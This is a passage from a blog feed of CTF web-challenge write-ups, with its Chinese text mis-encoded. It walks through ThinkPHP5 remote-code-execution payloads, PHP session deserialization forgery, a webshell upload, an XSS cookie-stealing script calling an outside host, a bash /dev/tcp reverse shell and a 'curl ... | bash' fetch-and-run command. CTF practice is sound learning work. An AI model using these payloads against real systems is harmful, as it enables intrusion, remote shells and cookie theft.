class="code"><pre><span class="line">index.phpï¼Ÿs=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo();</span><br></pre></td></tr></table></figure><img src="/2020/04/29/XMCTF/4.png" class="" title="examplename"><p>æˆåŠŸå›æ˜¾phpinfoé¡µé¢ï¼Œä¸‹é¢å°±å¯ä»¥çˆ†ç›®å½•æ–‡ä»¶äº†</p><img src="/2020/04/29/XMCTF/5.png" class="" title="examplename"><p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°äº†flagæ–‡ä»¶ï¼Œç›´æ¥è¯»å– system(â€œcat /flagâ€)å³å¯</p><h4 id="0X05-webEASYSESSION"><a href="#0X05-webEASYSESSION" class="headerlink" title="0X05:webEASYSESSION"></a>0X05:webEASYSESSION</h4><p>ç»™äº†æºç ï¼Œå®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$content = @$_GET[<span class="string">'content'</span>] ? <span class="string">"---mylocalnote---\n"</span> . $_GET[<span class="string">'content'</span>] : <span class="string">""</span>;</span><br><span class="line">$name = @$_GET[<span class="string">'name'</span>] ? $_GET[<span class="string">'name'</span>] : <span class="string">''</span>;</span><br><span class="line">str_replace(<span class="string">'/'</span>, <span class="string">''</span>, $name);</span><br><span class="line">str_replace(<span class="string">'\\'</span>, <span class="string">''</span>, $name);</span><br><span class="line">file_put_contents(<span class="string">"/tmp/"</span> . $name, $content);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Thank u,&#123;$_SESSION['username']&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯æœ‰å…³sessionçš„çŸ¥è¯†ç‚¹æ‰¾åˆ°ä¸œè¥¿</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessionååºåˆ—åŒ–</span><br><span class="line">PHPä½¿ç”¨æ–‡ä»¶å­˜å‚¨Sessionä¿¡æ¯ã€‚å› æ­¤å¦‚æœæˆ‘ä»¬æŠŠSessionæ–‡ä»¶æ›¿æ¢äº†ï¼Œå†™å…¥adminä¿¡æ¯ï¼Œé‚£ä¹ˆFlagå°±ä¼šå‡ºæ¥äº†ã€‚PHPçš„Sessionæ–‡ä»¶ä»¥â€sess_â€å¼€å¤´ï¼Œåæ¥Session IDï¼ŒSession IDä»…æœ‰[A-Za-z0-9-0]æ„æˆã€‚Ubuntué»˜è®¤å®‰è£…çš„PHPä¸­session.serialize_handleré»˜è®¤è®¾ç½®ä¸ºphpã€‚è¿™ç§æƒ…å†µä¸‹ï¼ŒSessionæ–‡ä»¶çš„å†…å®¹ä¸º(å±æ€§å)|(åºåˆ—åŒ–æ•°æ®)ã€‚åœ¨è®¿é—®Sessionæ•°æ®çš„æ—¶å€™ï¼ŒPHPä¼šè‡ªåŠ¨ååºåˆ—åŒ–ç›¸åº”æ•°æ®ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬æ„é€ Noteçš„æ ‡é¢˜åä¸ºâ€|N;admin|b:1;â€ã€‚è¿™æ ·ååºåˆ—åŒ–çš„ç»“æœå°±æ˜¯admin&#x3D;&#x3D;bool(true)ã€‚æˆ‘ä»¬å°±ä¼ªé€ äº†adminèº«ä»½ã€‚è€Œæˆ‘ä»¬è®¿é—®çš„æ—¶å€™ï¼Œé€šè¿‡ä¼ é€’Cookieçš„å€¼PHPSESSIDä¸ºæˆ‘ä»¬æƒ³è¦çš„Session IDï¼ŒPHPå°±ä¼šå»ååºåˆ—åŒ–ç›¸åº”çš„Sessionæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure><p>payload:?content=|N;username|s:5:%22admin%22;&amp;name=sess_p4c8k2sf8gkv0bb9j8uu6r7d99</p><p>æˆåŠŸå†™å…¥åä¸ºusername=adminçš„sessionID<br>å†è®¿é—®flag.phpï¼Œä¼ ä¸Šcookieå³å¯</p><h4 id="0X06ç¦æ­¢å¥—å¨ƒ"><a href="#0X06ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="0X06ç¦æ­¢å¥—å¨ƒ"></a>0X06ç¦æ­¢å¥—å¨ƒ</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//æ— å‚RCE</span></span><br><span class="line"><span class="comment">//localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</span></span><br><span class="line"><span class="comment">//scandir() åˆ—å‡º images ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚</span></span><br><span class="line"><span class="comment">//readfile() è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="comment">//current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚</span></span><br><span class="line"><span class="comment">//pos() current() çš„åˆ«åã€‚</span></span><br><span class="line"><span class="comment">//next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span></span><br><span class="line"><span class="comment">//array_reverse()ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚</span></span><br><span class="line"><span class="comment">//highlight_file()æ‰“å°è¾“å‡ºæˆ–è€…è¿”å› filename æ–‡ä»¶ä¸­è¯­æ³•é«˜äº®ç‰ˆæœ¬çš„ä»£ç ã€‚</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-EASY-WEB1&quot;&gt;&lt;a href=&quot;#0x01-EASY-WEB1&quot; class=&quot;headerlink&quot; title=&quot;0x01:EASY_WEB1&quot;&gt;&lt;/a&gt;0x01:EASY_WEB1&lt;/h3&gt;
    
    </summary>
    
    
    
      <category term="xm" scheme="http://yoursite.com/tags/xm/"/>
    
  </entry>
  
  <entry>
    <title>BJD2MRCTF</title>
    <link href="http://yoursite.com/2020/03/29/BJD2MRCTF/"/>
    <id>http://yoursite.com/2020/03/29/BJD2MRCTF/</id>
    <published>2020-03-29T05:24:57.000Z</published>
    <updated>2020-05-18T15:15:17.558Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MR"><a href="#MR" class="headerlink" title="MR"></a>MR</h2><a id="more"></a><h4 id="0X01-å¥—å¨ƒ"><a href="#0X01-å¥—å¨ƒ" class="headerlink" title="0X01: å¥—å¨ƒ"></a>0X01: å¥—å¨ƒ</h4><p>è®¿é—®é¢˜ç›®åœ°å€ï¼Œé¡µé¢æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œæ‰¾åˆ°ä¿¡æ¯</p><img src="/2020/03/29/BJD2MRCTF/MR1.png" class="" title="examplename"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span><span class="comment">//è¿™é‡Œç›¸å½“äºsubstr_count($query, '_') === 0 &amp;&amp; substr_count($query, '%5f') == 0</span></span><br><span class="line">è¿™é‡Œå‘å¯èƒ½æ˜¯å‡ºé¢˜äººä¸å°å¿ƒæ²¡æœ‰æ‰“ä¸Šå¯¹äº$queryä¼ å€¼çš„æ–¹å¼ï¼Œåæ¥å»ç™¾åº¦çš„æ—¶å€™å‘ç°æ˜¯æœ‰ä¸€ä¸ªå˜é‡$q_w_qç”¨_GETæ¥ä¼ å€¼çš„ï¼Œè¿™é‡Œå¯¹<span class="string">'_'</span>è¿›è¡Œäº†é™åˆ¶ï¼Œå¯ä»¥ç”¨phpçš„ç‰¹æ€§ç”¨.æ¥æ›¿ä»£</span><br><span class="line">($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>])<span class="comment">//è¿™é‡Œå¯ä»¥ç”¨%0aç»•è¿‡</span></span><br><span class="line"> payloadï¼š?b.u.p.t=<span class="number">23333</span>%<span class="number">0</span>a&amp;q.w.q=ls</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºä¸‹ä¸€æ­¥è·¯å¾„</p><img src="/2020/03/29/BJD2MRCTF/MR2.png" class="" title="examplename"><p>è®¿é—®ï¼Œæš‚æ—¶æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Œè¿˜æ˜¯æŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€æ®µjsfuckåŠ å¯†çš„å¯†æ–‡ï¼Œè§£å¯†ï¼špost me Merak</p><p>ç”¨burpæ¥è¿›è¡Œpostä¼ Merakï¼Œçˆ†å‡ºäº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Flag is here~But how to get it? <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//ç›´æ¥è¯´ä¸€ä¸‹æ„é€ payloadçš„æ€è·¯</span></span><br><span class="line"><span class="number">1.</span>ip===<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>æ„é€ ä¼ªIPåœ°å€ï¼Œåˆšå¼€å§‹æƒ³åˆ°çš„æ˜¯X-Forwarded-<span class="keyword">For</span>,å‘ç°ä¸è¡Œï¼Œæƒ³åˆ°äº†ä¹‹å‰æ¯”èµ›æ”¶é›†çš„ç±»ä¼¼çš„ä¼ªæ„é€ ï¼Œclient-IPå¯ç”¨</span><br><span class="line"><span class="number">2.</span>file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> ç”¨phpä¼ªåè®®php:<span class="comment">//inputå¯ä»¥postæ•°æ®</span></span><br><span class="line"><span class="number">3.</span>change($_GET[<span class="string">'file'</span>])ï¼Œæˆ‘ä»¬æœ€åè‚¯å®šæ˜¯è¦è¯»å–flag.phpçš„ï¼Œæ ¹æ®ç»™çš„åŠ å¯†æ–¹å¼åå‘è§£å¯†ï¼Œæ¨ç®—å‡º$vä¸ºfj]a&amp;f\bï¼Œåœ¨è¿›è¡Œbase64åŠ å¯†ï¼Œè¿™é‡Œè¦æ³¨æ„è¦åœ¨æœ¬åœ°base64åŠ å¯†ï¼Œç½‘ä¸Šçš„åŠ å¯†æœ‰ç‚¹é—®é¢˜</span><br></pre></td></tr></table></figure><img src="/2020/03/29/BJD2MRCTF/MR3.png" class="" title="examplename"><h4 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h4><p>æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œå°è¯•è¿‡å°é©¬ä¹‹åéƒ½å¤±è´¥äº†ï¼Œä¸Šä¼ ä¸€ä¸ª.htaccessï¼ŒæˆåŠŸ</p><p>å†ä¸Šä¼ å°é©¬ï¼ŒæˆåŠŸ</p><p>ç”¨èšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹flag</p><h2 id="BJD"><a href="#BJD" class="headerlink" title="BJD"></a>BJD</h2><h4 id="0X01-old-hacker"><a href="#0X01-old-hacker" class="headerlink" title="0X01:old hacker"></a>0X01:old hacker</h4><img src="/2020/03/29/BJD2MRCTF/old1.png" class="" title="examplename"><p>å¯ä»¥çœ‹åˆ°æç¤ºæ˜¯thinkphp5çš„ï¼Œç”¨expæµ‹è¯•ä¸€ä¸‹ï¼Œåˆ©ç”¨æŠ¥é”™æ”¶é›†ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;dir</span><br></pre></td></tr></table></figure><img src="/2020/03/29/BJD2MRCTF/old2.png" class="" title="examplename"><p>æ˜¯thinkphp5.2.23ç‰ˆæœ¬çš„ï¼Œå»æ‰¾ä¸€ä¸‹æœ‰å…³ç‰ˆæœ¬çš„æ¼æ´ï¼Œæ‰¾åˆ°äº†å¯ä»¥åˆ©ç”¨çš„payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=<span class="string">'id'</span></span><br></pre></td></tr></table></figure><p>idæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå¯ä»¥ç›´æ¥è¯»å–æ ¹ç›®å½•ä¸‹çš„flag</p><h4 id="0X02ï¼šXSS"><a href="#0X02ï¼šXSS" class="headerlink" title="0X02ï¼šXSS"></a>0X02ï¼šXSS</h4><p>è¿™é“é¢˜ç”¨åˆ°çš„æ˜¯phpå¯ç”¨çš„ååºåˆ—åŒ–åŸç”Ÿç±»ï¼Œä»¥ä¸‹æ˜¯exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æ‰«ä¸€éå‘ç°æœ‰gitæ³„éœ²ï¼Œç”¨Githackæ‹¿åˆ°æºç </p><img src="/2020/03/29/BJD2MRCTF/xss1.png" class="" title="examplename"><p>ç”¨ä¸Šé¢çš„æ–¹å¼ç”Ÿæˆåºåˆ—åŒ–æ•°æ®è¿›è¡Œæµ‹è¯•ï¼ŒæˆåŠŸå¼¹çª—</p><img src="/2020/03/29/BJD2MRCTF/xss2.png" class="" title="examplename"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script src='http://xss.fbisb.com/xss.php?do=login'&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ä¸Šé¢çš„è¿è¡Œç»“æœä½œä¸ºpayloadæ‰“ï¼Œåœ¨cookieé‡Œå¯ä»¥æ‰¾åˆ°flag</p><h4 id="0X03-Duangshell"><a href="#0X03-Duangshell" class="headerlink" title="0X03:Duangshell"></a>0X03:Duangshell</h4><p>æ‰“å¼€é¢˜ç›®æœ‰æç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">how can i give you source code? .swp?!</span><br></pre></td></tr></table></figure><p>è®¿é—®/.index.php.swpå¾—åˆ°æºç ï¼Œç”¨<code>vim -r index.php</code>æ¢å¤æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;ççˆ±ç½‘&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'girl_friend'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>postä¸€ä¸ªgirl_friendç„¶åç»•è¿‡ä¸€äº›æ­£åˆ™æ¯”é…ä¹‹åå°±<code>exec()</code>ï¼Œ<code>exec()</code>å’Œ<code>system()</code>ä¸åŒï¼Œ<code>exec()</code>æ— å›æ˜¾ï¼Œæ‰€ä»¥è¦è€ƒè™‘åå¼¹shellï¼Œè¿™é‡Œcurlæ²¡æœ‰è¢«banæ‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>åœ¨webæœåŠ¡ç›®å½•ä¸‹åˆ›å»ºshell.txtæ–‡ä»¶ï¼Œipå’Œportè‡ªå·±æ”¹ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">postæ•°æ®</span><br><span class="line">girl_friend=curl http:<span class="comment">//174.1.150.238/shell.txt|bash</span></span><br></pre></td></tr></table></figure><img src="/2020/03/29/BJD2MRCTF/shell.png" class="" title="examplename"><p>å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯è¦è‡ªå·±æ‰¾flagï¼Œç”¨linuxå‘½ä»¤ find/-name flagï¼ŒæˆåŠŸæ‰¾åˆ°</p><img src="/2020/03/29/BJD2MRCTF/shell1.png" class="" title="examplename"><h4 id="0X04ï¼šezpop-çœ‹wpå¤ç°çš„"><a href="#0X04ï¼šezpop-çœ‹wpå¤ç°çš„" class="headerlink" title="0X04ï¼šezpop(çœ‹wpå¤ç°çš„)"></a>0X04ï¼šezpop(çœ‹wpå¤ç°çš„)</h4><p>æ‰“å¼€é¢˜ç›®ç½‘å€ï¼Œæ‹¿åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    